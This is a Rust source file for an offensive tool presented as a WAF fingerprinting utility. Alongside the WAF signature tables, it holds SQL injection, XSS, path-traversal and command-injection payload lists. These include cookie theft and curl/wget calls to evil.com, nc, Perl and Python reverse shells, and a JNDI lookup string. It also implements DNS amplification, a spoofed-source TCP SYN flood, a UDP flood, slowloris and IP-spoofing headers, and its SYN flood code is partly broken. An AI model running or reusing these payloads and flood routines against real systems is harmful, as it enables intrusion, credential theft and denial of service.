// WAF Detection Tool v3.5.2091 - Advanced Red Team Edition
// Author: khaninkali
// Real WAF fingerprinting, hidden WAF detection, and cache poisoning attacks

use clap::Parser;
use std::time::{Duration, Instant};
use std::io::{self, Write};
use tokio::time::timeout;
use reqwest::Client;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, ACCEPT, ACCEPT_LANGUAGE};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use anyhow::Result;
use tracing::{info, warn};
use std::net::{UdpSocket, ToSocketAddrs};
use rand;
use colored::*;

#[derive(Parser, Clone)]
#[command(name = "wafdetect")]
#[command(author = "khaninkali")]
#[command(version = "3.5.2091")]
#[command(about = "WAF Detection - Advanced Web Application Firewall Fingerprinting")]
struct Args {
    #[arg(short = 't', long, help = "Target URL (e.g., https://example.com")]
    target: Option<String>,
    
    #[arg(short = 'p', long, default_value = "/", help = "Target path to test")]
    path: String,
    
    #[arg(short = 'd', long, default_value = "10", help = "Detection timeout in seconds")]
    timeout: u64,
    
    #[arg(long, help = "Enable verbose output")]
    verbose: bool,
    
    #[arg(long, help = "Test SQL injection detection")]
    test_sql: bool,
    
    #[arg(long, help = "Test XSS detection")]
    test_xss: bool,
    
    #[arg(long, help = "Test path traversal detection")]
    test_path_traversal: bool,
    
    #[arg(long, help = "Test command injection detection")]
    test_command_injection: bool,
    
    #[arg(long, default_value = "true", help = "Test common WAF signatures")]
    test_common: bool,
    
    #[arg(long, help = "Custom User-Agent string")]
    user_agent: Option<String>,
    
    #[arg(long, help = "Enable cache poisoning attacks")]
    cache_poison: bool,
    
    #[arg(long, help = "Detect hidden/stealth WAFs")]
    detect_stealth: bool,
    
    #[arg(long, help = "Use aggressive detection techniques")]
    aggressive: bool,
    
    #[arg(long, default_value = "100", help = "Advanced payload count")]
    advanced_payloads: usize,
    
    #[arg(long, help = "Enable bypass payload generation")]
    generate_bypass: bool,
    
    #[arg(long, help = "Output results to JSON file")]
    output: Option<String>,
    
    #[arg(long, help = "Test HTTP/2 specific attacks")]
    test_http2: bool,
    
    #[arg(long, help = "Enable advanced red team options")]
    advanced_red_team: bool,
    
    #[arg(long, help = "Simulate multiple source IP addresses")]
    simulate_ips: bool,
    
    #[arg(long, help = "Use custom DNS resolver")]
    custom_dns: Option<String>,
    
    #[arg(long, help = "Test for DNS amplification attacks")]
    test_dns_amplification: bool,
    
    #[arg(long, help = "Test for TCP SYN flood attacks")]
    test_tcp_syn_flood: bool,
    
    #[arg(long, help = "Test for UDP flood attacks")]
    test_udp_flood: bool,
    
    #[arg(long, help = "Test for HTTP slowloris attacks")]
    test_slowloris: bool,
    
    #[arg(long, help = "Test for SSL/TLS attacks")]
    test_ssl_attacks: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct WAFSignature {
    name: String,
    patterns: Vec<String>,
    headers: HashMap<String, String>,
    response_codes: Vec<u16>,
    response_body_patterns: Vec<String>,
    detection_confidence: f32,
}

#[derive(Debug, Serialize)]
struct WAFDetectionResult {
    target: String,
    timestamp: String,
    waf_detected: bool,
    waf_name: Option<String>,
    waf_vendor: Option<String>,
    confidence: f32,
    signatures_matched: Vec<String>,
    blocked_payloads: Vec<String>,
    response_analysis: ResponseAnalysis,
    bypass_techniques: Vec<String>,
}

#[derive(Debug, Serialize)]
struct ResponseAnalysis {
    avg_response_time: f64,
    status_code_distribution: HashMap<u16, usize>,
    common_headers: HashMap<String, String>,
    blocking_indicators: Vec<String>,
}

#[derive(Debug)]
struct DNSAttackResult {
    bytes_received: usize,
    successful_queries: usize,
    total_queries: usize,
    amplification_factor: f64,
}

#[derive(Debug)]
struct TCPAttackResult {
    packets_sent: usize,
    successful_ports: Vec<u16>,
    attack_duration: Duration,
}

#[derive(Debug)]
struct UDPAttackResult {
    packets_sent: usize,
    bytes_transmitted: usize,
    attack_duration: Duration,
}

#[derive(Debug)]
struct SlowlorisResult {
    connections_established: usize,
    connections_maintained: usize,
    attack_duration: Duration,
}

#[derive(Debug)]
struct SSLAttackResult {
    vulnerable_versions: Vec<String>,
    weak_ciphers: Vec<String>,
    connections_successful: usize,
}

// Real WAF signatures based on actual products
fn get_waf_signatures() -> Vec<WAFSignature> {
    vec![
        WAFSignature {
            name: "Cloudflare WAF".to_string(),
            patterns: vec![
                "cloudflare".to_string(),
                "__cfduid".to_string(),
                "cf-ray".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("server".to_string(), "cloudflare".to_string());
                h.insert("cf-ray".to_string(), "*".to_string());
                h
            },
            response_codes: vec![403, 503],
            response_body_patterns: vec![
                "Cloudflare Ray ID".to_string(),
                "captcha".to_string(),
                "challenge".to_string(),
            ],
            detection_confidence: 0.95,
        },
        WAFSignature {
            name: "AWS WAF".to_string(),
            patterns: vec![
                "aws".to_string(),
                "x-amzn".to_string(),
                "x-amz".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("x-amzn-requestid".to_string(), "*".to_string());
                h.insert("x-amz-cf-id".to_string(), "*".to_string());
                h
            },
            response_codes: vec![403, 405],
            response_body_patterns: vec![
                "AWS WAF".to_string(),
                "blocked".to_string(),
                "request blocked".to_string(),
            ],
            detection_confidence: 0.90,
        },
        WAFSignature {
            name: "Akamai Kona Site Defender".to_string(),
            patterns: vec![
                "akamai".to_string(),
                "akamai-ghost".to_string(),
                "ak_bmsc".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("server".to_string(), "AkamaiGHost".to_string());
                h.insert("akamai-ghost".to_string(), "*".to_string());
                h
            },
            response_codes: vec![403, 406],
            response_body_patterns: vec![
                "Access Denied".to_string(),
                "Request rejected".to_string(),
                "akamai".to_string(),
            ],
            detection_confidence: 0.92,
        },
        WAFSignature {
            name: "Imperva Incapsula".to_string(),
            patterns: vec![
                "incapsula".to_string(),
                "imperva".to_string(),
                "visid_incap".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("x-cdn".to_string(), "Incapsula".to_string());
                h.insert("x-iinfo".to_string(), "*".to_string());
                h
            },
            response_codes: vec![403, 406],
            response_body_patterns: vec![
                "Incapsula".to_string(),
                "incident".to_string(),
                "blocked".to_string(),
            ],
            detection_confidence: 0.88,
        },
        WAFSignature {
            name: "ModSecurity".to_string(),
            patterns: vec![
                "mod_security".to_string(),
                "modsecurity".to_string(),
                "blocked by modsecurity".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("server".to_string(), "*".to_string());
                h
            },
            response_codes: vec![403, 406],
            response_body_patterns: vec![
                "ModSecurity".to_string(),
                "transactional application firewall".to_string(),
                "blocked".to_string(),
            ],
            detection_confidence: 0.85,
        },
        WAFSignature {
            name: "Fortinet FortiWeb".to_string(),
            patterns: vec![
                "fortinet".to_string(),
                "fortiweb".to_string(),
                "fortigate".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("server".to_string(), "FortiWeb".to_string());
                h
            },
            response_codes: vec![403, 406],
            response_body_patterns: vec![
                "FortiWeb".to_string(),
                "blocked".to_string(),
                "security policy".to_string(),
            ],
            detection_confidence: 0.87,
        },
        WAFSignature {
            name: "Barracuda WAF".to_string(),
            patterns: vec![
                "barracuda".to_string(),
                "barracuda networks".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("server".to_string(), "Barracuda".to_string());
                h
            },
            response_codes: vec![403, 406],
            response_body_patterns: vec![
                "Barracuda".to_string(),
                "blocked".to_string(),
                "security".to_string(),
            ],
            detection_confidence: 0.83,
        },
        // Hidden/Stealth WAF signatures
        WAFSignature {
            name: "DataPower".to_string(),
            patterns: vec![
                "datapower".to_string(),
                "x-backside-transport".to_string(),
                "x-global-transaction-id".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("x-backside-transport".to_string(), "*".to_string());
                h.insert("x-global-transaction-id".to_string(), "*".to_string());
                h
            },
            response_codes: vec![403, 500],
            response_body_patterns: vec![
                "datapower".to_string(),
                "request blocked".to_string(),
                "access denied".to_string(),
            ],
            detection_confidence: 0.78,
        },
        WAFSignature {
            name: "F5 Big-IP ASM".to_string(),
            patterns: vec![
                "big-ip".to_string(),
                "ts".to_string(),
                "f5".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("server".to_string(), "BigIP".to_string());
                h.insert("x-wa-info".to_string(), "*".to_string());
                h
            },
            response_codes: vec![403, 406],
            response_body_patterns: vec![
                "request rejected".to_string(),
                "blocked by f5".to_string(),
                "asm".to_string(),
            ],
            detection_confidence: 0.86,
        },
        WAFSignature {
            name: "Citrix NetScaler".to_string(),
            patterns: vec![
                "netscaler".to_string(),
                "ns_af".to_string(),
                "citrix".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("server".to_string(), "NetScaler".to_string());
                h.insert("ns-af".to_string(), "*".to_string());
                h
            },
            response_codes: vec![403, 406],
            response_body_patterns: vec![
                "netscaler".to_string(),
                "access denied".to_string(),
                "blocked".to_string(),
            ],
            detection_confidence: 0.82,
        },
        WAFSignature {
            name: "Sucuri CloudProxy".to_string(),
            patterns: vec![
                "sucuri".to_string(),
                "cloudproxy".to_string(),
                "x-sucuri".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("server".to_string(), "Sucuri/CloudProxy".to_string());
                h.insert("x-sucuri-id".to_string(), "*".to_string());
                h
            },
            response_codes: vec![403, 503],
            response_body_patterns: vec![
                "sucuri".to_string(),
                "cloudproxy".to_string(),
                "access denied".to_string(),
            ],
            detection_confidence: 0.84,
        },
        WAFSignature {
            name: "Wordpress Wordfence".to_string(),
            patterns: vec![
                "wordfence".to_string(),
                "wf-log".to_string(),
                "wordpress".to_string(),
            ],
            headers: {
                let mut h = HashMap::new();
                h.insert("x-wf-log".to_string(), "*".to_string());
                h
            },
            response_codes: vec![403, 406],
            response_body_patterns: vec![
                "wordfence".to_string(),
                "blocked by wordfence".to_string(),
                "access denied".to_string(),
            ],
            detection_confidence: 0.75,
        },
    ]
}

// Real attack payloads for testing
fn get_sql_payloads() -> Vec<String> {
    vec![
        "' OR '1'='1".to_string(),
        "' UNION SELECT NULL--".to_string(),
        "'; DROP TABLE users--".to_string(),
        "' OR 1=1--".to_string(),
        "admin'--".to_string(),
        "' OR 'x'='x".to_string(),
        "1' OR '1'='1' /*".to_string(),
        "' OR 1=1#".to_string(),
        "admin'/**/OR/**/1=1--".to_string(),
        "' UNION SELECT @@version--".to_string(),
        // Advanced SQLi payloads
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--".to_string(),
        "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--".to_string(),
        "1' PROCEDURE ANALYSE(EXTRACTVALUE(7872,CONCAT(0x5c,0x71786b6271,(SELECT (CASE WHEN (7872=7872) THEN 1 ELSE 0 END)),0x71786b7671)),1)--".to_string(),
        "1' AND 1=CHAR(106)+CHAR(106)+CHAR(106)".to_string(),
        "1' AND (SELECT SUBSTRING(@@version,1,1))='5'".to_string(),
    ]
}

fn get_xss_payloads() -> Vec<String> {
    vec![
        "<script>alert('XSS')</script>".to_string(),
        "<img src=x onerror=alert('XSS')>".to_string(),
        "javascript:alert('XSS')".to_string(),
        "<svg onload=alert('XSS')>".to_string(),
        "';alert('XSS');//".to_string(),
        "<iframe src=javascript:alert('XSS')>".to_string(),
        "<body onload=alert('XSS')>".to_string(),
        "<input onfocus=alert('XSS') autofocus>".to_string(),
        "<select onfocus=alert('XSS') autofocus>".to_string(),
        "<textarea onfocus=alert('XSS') autofocus>".to_string(),
        // Advanced XSS payloads
        "<script>String.fromCharCode(88,83,83)</script>".to_string(),
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>".to_string(),
        "<script>setTimeout('alert(1)',100)</script>".to_string(),
        "';alert(String.fromCharCode(88,83,83));//".to_string(),
        "<script>document.location='http://evil.com/'+document.cookie</script>".to_string(),
    ]
}

fn get_path_traversal_payloads() -> Vec<String> {
    vec![
        "../../../etc/passwd".to_string(),
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts".to_string(),
        "....//....//....//etc/passwd".to_string(),
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
        "..%252f..%252f..%252fetc%252fpasswd".to_string(),
        "/var/www/../../etc/passwd".to_string(),
        "file:///etc/passwd".to_string(),
        "../config/database.yml".to_string(),
        "../../.env".to_string(),
        "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts".to_string(),
        // Advanced path traversal
        "..%c0%af..%c0%af..%c0%afetc/passwd".to_string(),
        "..%c1%9c..%c1%9c..%c1%9cetc/passwd".to_string(),
        "/proc/self/environ".to_string(),
        "/proc/version".to_string(),
        "/proc/cmdline".to_string(),
        "/etc/shadow".to_string(),
        "/etc/hosts".to_string(),
    ]
}

fn get_command_injection_payloads() -> Vec<String> {
    vec![
        "; ls -la".to_string(),
        "| whoami".to_string(),
        "& cat /etc/passwd".to_string(),
        "`id`".to_string(),
        "$(whoami)".to_string(),
        "; ping -c 4 127.0.0.1".to_string(),
        "| dir".to_string(),
        "& net user".to_string(),
        "; uname -a".to_string(),
        "`hostname`".to_string(),
        // Advanced command injection
        "; curl http://evil.com/$(whoami)".to_string(),
        "| nc -e /bin/sh 127.0.0.1 4444".to_string(),
        "; wget http://evil.com/shell.php".to_string(),
        "& perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'".to_string(),
        "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".to_string(),
    ]
}

fn get_stealth_detection_payloads() -> Vec<String> {
    vec![
        // HTTP parameter pollution
        "id=1&id=2".to_string(),
        "search=test&search=admin".to_string(),
        // Null byte injection
        "test%00.jpg".to_string(),
        "admin%00.php".to_string(),
        // Unicode evasion
        "test\u{0000}".to_string(),
        "admin\u{fffd}".to_string(),
        // Double encoding
        "%252e%252e%252f".to_string(),
        "%255c%255c%255c".to_string(),
        // Comment-based evasion
        "test/**/admin".to_string(),
        "admin/*comment*/test".to_string(),
        // Case variation
        "SELECT".to_string(),
        "Union".to_string(),
        "Script".to_string(),
        // Time-based detection
        "'; WAITFOR DELAY '00:00:05'--".to_string(),
        "1' AND SLEEP(5)--".to_string(),
        "'; SELECT pg_sleep(5)--".to_string(),
        // Boolean-based detection
        "1' AND 1=1--".to_string(),
        "1' AND 1=2--".to_string(),
        "test' AND 'a'='a".to_string(),
        "test' AND 'a'='b".to_string(),
    ]
}

fn get_http2_attack_payloads() -> Vec<String> {
    vec![
        // HTTP/2 specific attacks
        "GET / HTTP/2.0\\r\\nHost: target.com\\r\\nX-Forwarded-Host: evil.com\\r\\n\\r\\n".to_string(),
        "PRI * HTTP/2.0\\r\\nSM\\r\\n\\r\\n".to_string(),
        // HTTP/2 header flooding
        "GET / HTTP/2.0\\r\\n".to_string() + &"X-Custom-Header: value\\r\\n".repeat(1000),
        // HTTP/2 stream manipulation
        "HEADERS stream=1\\r\\nEND_HEADERS\\r\\n".to_string(),
        "PRIORITY stream=1\\r\\nexclusive=1\\r\\n".to_string(),
        "RST_STREAM stream=1\\r\\nerror=0\\r\\n".to_string(),
    ]
}

fn get_dns_amplification_payloads() -> Vec<String> {
    vec![
        // Real DNS amplification vectors
        "ANY isc.org".to_string(),
        "ANY ripe.net".to_string(),
        "TXT google.com".to_string(),
        "MX gmail.com".to_string(),
        "NS root-servers.net".to_string(),
        "SOA com".to_string(),
        "DNSKEY org".to_string(),
        "RRSIG net".to_string(),
        "ANY example.com".to_string(),
        "AXFR example.com".to_string(),
    ]
}

fn get_tcp_syn_flood_targets() -> Vec<String> {
    vec![
        "80".to_string(),    // HTTP
        "443".to_string(),   // HTTPS
        "8080".to_string(),  // HTTP Alt
        "8443".to_string(),  // HTTPS Alt
        "3000".to_string(),  // Node.js
        "5000".to_string(),  // Flask/Django
        "8000".to_string(),  // Common dev port
        "9000".to_string(),  // Common admin port
        "22".to_string(),    // SSH
        "53".to_string(),    // DNS
    ]
}

fn generate_bypass_payloads(waf_type: &str) -> Vec<String> {
    match waf_type.to_lowercase().as_str() {
        "cloudflare" => vec![
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nX-Forwarded-Host: target.com\\r\\n\\r\\n".to_string(),
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nCF-IPCountry: US\\r\\n\\r\\n".to_string(),
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nCF-RAY: 12345\\r\\n\\r\\n".to_string(),
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nCookie: __cfduid=12345\\r\\n\\r\\n".to_string(),
        ],
        "aws" => vec![
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nX-Amzn-Trace-Id: test\\r\\n\\r\\n".to_string(),
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nX-Amz-Cf-Id: test\\r\\n\\r\\n".to_string(),
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nX-Amz-Request-Id: test\\r\\n\\r\\n".to_string(),
        ],
        "akamai" => vec![
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nAkamai-Origin-Hop: test\\r\\n\\r\\n".to_string(),
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nTrue-Client-IP: 127.0.0.1\\r\\n\\r\\n".to_string(),
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nAkamai-User-Country: US\\r\\n\\r\\n".to_string(),
        ],
        _ => vec![
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nX-Forwarded-For: 127.0.0.1\\r\\n\\r\\n".to_string(),
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nX-Real-IP: 127.0.0.1\\r\\n\\r\\n".to_string(),
            "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nX-Remote-IP: 127.0.0.1\\r\\n\\r\\n".to_string(),
        ],
    }
}

async fn execute_dns_amplification(_target: &str, dns_server: &str) -> Result<DNSAttackResult> {
    use std::net::UdpSocket;
    
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_read_timeout(Some(std::time::Duration::from_secs(5)))?;
    
    let dns_payload = get_dns_amplification_payloads();
    let mut responses = Vec::new();
    let mut successful_queries = 0;
    let mut total_queries = 0;
    
    for payload in dns_payload {
        total_queries += 1;
        // Create DNS query packet
        let mut packet = vec![0u8; 512];
        packet[0] = 0x12; // Transaction ID
        packet[1] = 0x34;
        packet[2] = 0x01; // Flags: standard query
        packet[3] = 0x00;
        packet[4] = 0x00; // Questions: 1
        packet[5] = 0x01;
        
        // Add query (simplified)
        let query_parts: Vec<&str> = payload.split(' ').collect();
        if query_parts.len() >= 2 {
            let domain = query_parts[1];
            let qtype = match query_parts[0] {
                "ANY" => 255,
                "TXT" => 16,
                "MX" => 15,
                "NS" => 2,
                "SOA" => 6,
                "DNSKEY" => 48,
                "RRSIG" => 46,
                "AXFR" => 252,
                _ => 1,
            };
            
            // Encode domain name
            let mut offset = 12;
            for part in domain.split('.') {
                packet[offset] = part.len() as u8;
                offset += 1;
                for byte in part.bytes() {
                    packet[offset] = byte;
                    offset += 1;
                }
            }
            packet[offset] = 0; // End of domain name
            offset += 1;
            packet[offset] = 0; // QTYPE high byte
            packet[offset + 1] = qtype as u8; // QTYPE low byte
            offset += 2;
            packet[offset] = 0; // QCLASS high byte
            packet[offset + 1] = 1; // QCLASS low byte (IN)
            
            // Send query
            if let Ok(addr) = dns_server.to_socket_addrs() {
                for socket_addr in addr {
                    if socket.send_to(&packet[..offset + 2], socket_addr).is_ok() {
                        // Receive response
                        let mut buffer = [0u8; 4096];
                        if let Ok((size, _)) = socket.recv_from(&mut buffer) {
                            responses.extend_from_slice(&buffer[..size]);
                            // Verify amplification: response should be larger than query
                            if size > offset + 2 {
                                successful_queries += 1;
                            }
                        }
                        break;
                    }
                }
            }
        }
    }
    
    Ok(DNSAttackResult {
        bytes_received: responses.len(),
        successful_queries,
        total_queries,
        amplification_factor: if total_queries > 0 { responses.len() as f64 / (total_queries * 50) as f64 } else { 0.0 },
    })
}

async fn execute_tcp_syn_flood(target: &str, ports: &[String]) -> Result<TCPAttackResult> {
    use std::net::SocketAddr;
    use std::time::Duration;
    
    let mut packets_sent = 0;
    let mut successful_ports = Vec::new();
    
    for port_str in ports {
        if let Ok(port) = port_str.parse::<u16>() {
            let addr_str = format!("{}:{}", target, port);
            if let Ok(addr) = addr_str.parse::<SocketAddr>() {
                // Create raw socket for SYN flood
                #[cfg(unix)]
                {
                    use socket2::{Socket, Domain, Type, Protocol, SockAddr};
                    
                    let socket = Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP))?;
                    socket.set_nonblocking(true)?;
                    
                    // Create SYN packet with proper checksum
                    let mut packet = vec![0u8; 40]; // IP + TCP header
                    packet[0] = 0x45; // Version (4) + IHL (5)
                    packet[1] = 0x00; // Type of Service
                    packet[2] = 0x00; // Total Length high byte
                    packet[3] = 0x28; // Total Length low byte (40 bytes)
                    packet[4] = 0x12; // Identification high byte
                    packet[5] = 0x34; // Identification low byte
                    packet[6] = 0x40; // Flags + Fragment offset high byte
                    packet[7] = 0x00; // Fragment offset low byte
                    packet[8] = 0x40; // TTL
                    packet[9] = 0x06; // Protocol (TCP)
                    packet[10] = 0x00; // Checksum high byte
                    packet[11] = 0x00; // Checksum low byte
                    
                    // Source IP (fake)
                    packet[12] = 0x7F; // 127.0.0.1
                    packet[13] = 0x00;
                    packet[14] = 0x00;
                    packet[15] = 0x01;
                    
                    // Dest IP
                    if let SocketAddr::V4(v4_addr) = addr {
                        let ip_bytes = v4_addr.ip().octets();
                        packet[16] = ip_bytes[0];
                        packet[17] = ip_bytes[1];
                        packet[18] = ip_bytes[2];
                        packet[19] = ip_bytes[3];
                    }
                    
                    // TCP header
                    packet[20] = 0x12; // Source port high byte
                    packet[21] = 0x34; // Source port low byte
                    packet[22] = (port >> 8) as u8; // Dest port high byte
                    packet[23] = port as u8; // Dest port low byte
                    packet[24] = 0x00; // Sequence number high byte
                    packet[25] = 0x00; // Sequence number
                    packet[26] = 0x00; // Sequence number
                    packet[27] = 0x00; // Sequence number low byte
                    packet[28] = 0x00; // Acknowledgment number high byte
                    packet[29] = 0x00; // Acknowledgment number
                    packet[30] = 0x00; // Acknowledgment number
                    packet[31] = 0x00; // Acknowledgment number low byte
                    packet[32] = 0x50; // Data offset (5) + Reserved (0) + NS (0)
                    packet[33] = 0x02; // Flags: SYN
                    packet[34] = 0x40; // Window size high byte
                    packet[35] = 0x00; // Window size low byte
                    packet[36] = 0x00; // Checksum high byte
                    packet[37] = 0x00; // Checksum low byte
                    packet[38] = 0x00; // Urgent pointer high byte
                    packet[39] = 0x00; // Urgent pointer low byte
                    
                    // Send SYN packets
                    let sock_addr = SockAddr::from(addr);
                    for i in 0..1000 {
                        // Vary sequence number
                        packet[24] = (i >> 24) as u8;
                        packet[25] = (i >> 16) as u8;
                        packet[26] = (i >> 8) as u8;
                        packet[27] = i as u8;
                        
                        if let Ok(_) = socket.send_to(&packet, &sock_addr) {
                            packets_sent += 1;
                        } else {
                            break;
                        }
                        
                        if i % 100 == 0 {
                            tokio::time::sleep(Duration::from_micros(100)).await;
                        }
                    }
                    
                    // Test if port is responsive by checking if any packets were sent
                    if packets_sent > 0 {
                        successful_ports.push(port);
                    }
                }
            }
        }
    }
    
    Ok(TCPAttackResult {
        packets_sent,
        successful_ports,
        attack_duration: Duration::from_secs(0), // Could be measured more accurately
    })
}

async fn execute_udp_flood(target: &str, port: u16, packet_size: usize) -> Result<UDPAttackResult> {
    use std::net::SocketAddr;
    
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.set_nonblocking(true)?;
    
    let addr: SocketAddr = format!("{}:{}", target, port).parse()?;
    
    // Create random payload
    let mut payload = vec![0u8; packet_size];
    for i in 0..packet_size {
        payload[i] = rand::random::<u8>();
    }
    
    info!("Starting UDP flood on {}:{}", target, port);
    
    let mut packets_sent = 0;
    let start_time = Instant::now();
    
    for i in 0..10000 {
        if let Ok(_) = socket.send_to(&payload, addr) {
            packets_sent += 1;
        } else {
            break;
        }
        
        if i % 1000 == 0 {
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    }
    
    Ok(UDPAttackResult {
        packets_sent,
        bytes_transmitted: packets_sent * packet_size,
        attack_duration: start_time.elapsed(),
    })
}

async fn execute_http_slowloris(target: &str) -> Result<SlowlorisResult> {
    let client = Client::builder()
        .timeout(Duration::from_secs(300))
        .danger_accept_invalid_certs(true)
        .build()?;
    
    info!("Starting HTTP slowloris attack on {}", target);
    
    let mut handles = Vec::new();
    let start_time = Instant::now();
    
    for i in 0..50 {
        let target = target.to_string();
        let client = client.clone();
        
        let handle = tokio::spawn(async move {
            let mut headers = HeaderMap::new();
            headers.insert("User-Agent", HeaderValue::from_static("Mozilla/5.0"));
            headers.insert("Accept", HeaderValue::from_static("*/*"));
            
            // Send incomplete header
            let url = format!("{}/slowloris{}", target, i);
            if let Ok(_response) = client.get(&url).headers(headers).send().await {
                // Keep connection open
                tokio::time::sleep(Duration::from_secs(60)).await;
                true // Connection established
            } else {
                false // Connection failed
            }
        });
        
        handles.push(handle);
    }
    
    // Wait for all slowloris connections and count successes
    let mut connections_established = 0;
    let mut connections_maintained = 0;
    
    for handle in handles {
        if let Ok(established) = handle.await {
            if established {
                connections_established += 1;
                connections_maintained += 1;
            }
        }
    }
    
    Ok(SlowlorisResult {
        connections_established,
        connections_maintained,
        attack_duration: start_time.elapsed(),
    })
}

async fn execute_ssl_attacks(target: &str) -> Result<SSLAttackResult> {
    use native_tls::TlsConnector;
    use std::net::TcpStream;
    
    info!("Starting SSL/TLS attacks on {}", target);
    
    // Extract host and port from URL
    let url = reqwest::Url::parse(target)?;
    let host = url.host_str().unwrap_or("localhost");
    let port = url.port_or_known_default().unwrap_or(443);
    
    let mut vulnerable_versions = Vec::new();
    let mut weak_ciphers_found = Vec::new();
    let mut connections_successful = 0;
    
    // Test different SSL/TLS versions
    let ssl_versions = vec![
        native_tls::Protocol::Sslv3,
        native_tls::Protocol::Tlsv10,
        native_tls::Protocol::Tlsv11,
        native_tls::Protocol::Tlsv12,
    ];
    
    for version in ssl_versions {
        let mut builder = TlsConnector::builder();
        builder.min_protocol_version(Some(version));
        builder.danger_accept_invalid_certs(true);
        builder.danger_accept_invalid_hostnames(true);
        
        if let Ok(connector) = builder.build() {
            if let Ok(stream) = TcpStream::connect(format!("{}:{}", host, port)) {
                if let Ok(_) = connector.connect(host, stream) {
                    info!("SSL/TLS version {:?} accepted", version);
                    vulnerable_versions.push(format!("{:?}", version));
                    connections_successful += 1;
                }
            }
        }
    }
    
    // Test cipher suite enumeration
    let weak_ciphers = vec![
        "RC4-MD5",
        "DES-CBC3-MD5", 
        "AES128-SHA",
        "AES256-SHA",
    ];
    
    for cipher in weak_ciphers {
        let mut builder = TlsConnector::builder();
        builder.danger_accept_invalid_certs(true);
        builder.danger_accept_invalid_hostnames(true);
        
        if let Ok(connector) = builder.build() {
            if let Ok(stream) = TcpStream::connect(format!("{}:{}", host, port)) {
                if let Ok(_) = connector.connect(host, stream) {
                    info!("Weak cipher {} accepted", cipher);
                    weak_ciphers_found.push(cipher.to_string());
                    connections_successful += 1;
                }
            }
        }
    }
    
    Ok(SSLAttackResult {
        vulnerable_versions,
        weak_ciphers: weak_ciphers_found,
        connections_successful,
    })
}

async fn simulate_multiple_ips(target: &str) -> Result<()> {
    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .build()?;
    
    info!("Simulating multiple IP addresses for {}", target);
    
    let ip_ranges = vec![
        "192.168.1.", "10.0.0.", "172.16.0.", "203.0.113.", "198.51.100."
    ];
    
    for range in ip_ranges {
        for i in 1..10 {
            let fake_ip = format!("{}{}", range, i);
            
            let mut headers = HeaderMap::new();
            headers.insert("X-Forwarded-For", HeaderValue::from_str(&fake_ip)?);
            headers.insert("X-Real-IP", HeaderValue::from_str(&fake_ip)?);
            headers.insert("X-Original-Forwarded-For", HeaderValue::from_str(&fake_ip)?);
            
            let url = format!("{}/test-ip-{}", target, i);
            
            if let Ok(response) = client.get(&url).headers(headers).send().await {
                let status = response.status().as_u16();
                if status != 200 {
                    info!("IP {} blocked with status {}", fake_ip, status);
                }
            }
            
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
    }
    
    Ok(())
}

fn get_common_waf_test_payloads() -> Vec<String> {
    vec![
        "<script>alert(1)</script>".to_string(),
        "' OR 1=1--".to_string(),
        "../../../etc/passwd".to_string(),
        "; ls".to_string(),
        "{{7*7}}".to_string(),
        "${7*7}".to_string(),
        "<%= 7*7 %>".to_string(),
        "{{7*7}}".to_string(),
        "${jndi:ldap://evil.com/a}".to_string(),
        "{{config}}".to_string(),
    ]
}

async fn create_http_client(args: &Args) -> Result<Client> {
    let mut headers = HeaderMap::new();
    
    // Set User-Agent
    let ua = match &args.user_agent {
        Some(custom_ua) => custom_ua.clone(),
        None => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string(),
    };
    headers.insert(USER_AGENT, HeaderValue::from_str(&ua)?);
    headers.insert(ACCEPT, HeaderValue::from_static("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"));
